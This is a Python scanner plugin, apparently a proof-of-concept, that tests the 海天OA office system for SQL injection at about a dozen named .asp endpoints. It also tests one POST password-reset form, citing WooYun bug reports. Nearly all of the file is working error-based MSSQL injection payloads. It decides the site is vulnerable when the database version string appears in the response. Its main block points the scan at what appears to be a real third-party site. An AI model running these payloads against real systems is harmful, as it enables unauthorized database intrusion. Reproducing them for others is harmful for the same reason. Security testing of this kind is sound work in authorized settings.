#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: 海天OA多处SQL注入
author: yichin
refer: 
    http://www.wooyun.org/bugs/wooyun-2010-061977
    http://www.wooyun.org/bugs/wooyun-2014-084056
    http://www.wooyun.org/bugs/wooyun-2010-077073
    http://www.wooyun.org/bugs/wooyun-2014-082899
    http://www.wooyun.org/bugs/wooyun-2010-076841
    http://www.wooyun.org/bugs/wooyun-2010-076828
    http://www.wooyun.org/bugs/wooyun-2010-077183
    http://www.wooyun.org/bugs/wooyun-2010-083281
    http://www.wooyun.org/bugs/wooyun-2010-081647
    http://www.wooyun.org/bugs/wooyun-2010-081633
    http://www.wooyun.org/bugs/wooyun-2010-082211
    http://www.wooyun.org/bugs/wooyun-2010-085252
    
description:
    这货真能刷
'''

def assign(service, arg):
    if service == 'haitianoa':
        return True, arg

def audit(arg):
    #GET型
    urls = [
        arg + 'PowerSelect.asp?FieldValue=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
        arg + 'Documents/FolderInfor.asp?POAID=1%27%20and%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20and%20%271%27=%271',
        arg + 'Include/ChaXunDetail.asp?FID=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'portal/index.asp?id=-233%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version&returndata=true%20id=1',
        arg + 'information/OA_Condition.asp?subclass=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'Documents/FolderInfor.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'meetingroom/MeetingRoom_UseInfo.asp?MeetingRoom=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'ZhuanTi/FolderDetails.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'include/user/treedata.asp?bumenid=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
        arg + 'car/ShenQingInforDis.asp?OAID=1%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version',
        arg + 'flow/BiaoDanDangAn.asp?BiaoDanID=1%27%20or%201=CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version--',
        arg + 'VO_EmailCaoGao.asp?StartDate=1%27)%20or%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version%20)--',
    ]
    for url in urls:
        code, head, res, err, _ = curl.curl2(url)
        if ((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
            security_hole("SQL Injection: " + url)
    #POST型
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    url = arg + 'LosePassAction.asp'
    data = 'username=123\'%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--&Remark=123'
    code, head, res, err, _ = curl.curl2(url, post=data, header=content_type)
    if((code == 200) or (code == 500)) and ('WtFaBcMicrosoft SQL Server' in res):
        security_hole('SQL Injection: ' + url + " POST:" +data)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('haitianoa', 'http://www.fzsyxx.com/oa/')[1])
